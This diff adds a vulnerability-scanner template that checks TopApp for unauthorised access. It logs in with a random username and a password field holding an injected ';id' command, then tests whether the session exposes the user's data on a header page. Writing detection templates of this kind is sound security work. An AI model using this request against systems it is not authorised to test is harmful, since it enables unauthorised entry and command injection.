@@ -1,0 +1,50 @@
+id: topapp-unauthorized-access
+info:
+  name: TopApp Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: high
+  reference:
+    - https://www.cnblogs.com/yuzly/p/13673760.html
+  description: |
+    This template detects unauthorized access in TopApp by validating login and checking for user information leakage in subsequent requests.
+
+variables:
+  tmp_cookie: "{{rand_text_alphanumeric(26)}}"
+  tmp_username: "{{rand_text_alphanumeric(8)}}"
+
+http:
+  - id: login-check
+    method: POST
+    path:
+      - "{{BaseURL}}/login_check.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: PHPSESSID={{tmp_cookie}}
+    body: "userName={{tmp_username}}&password=%3Bid&x=0&y=0"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "location: redirect.php"
+
+  - id: check-header
+    method: GET
+    path:
+      - "{{BaseURL}}/acc/Header.php"
+    headers:
+      Cookie: PHPSESSID={{tmp_cookie}}
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{tmp_username}}"
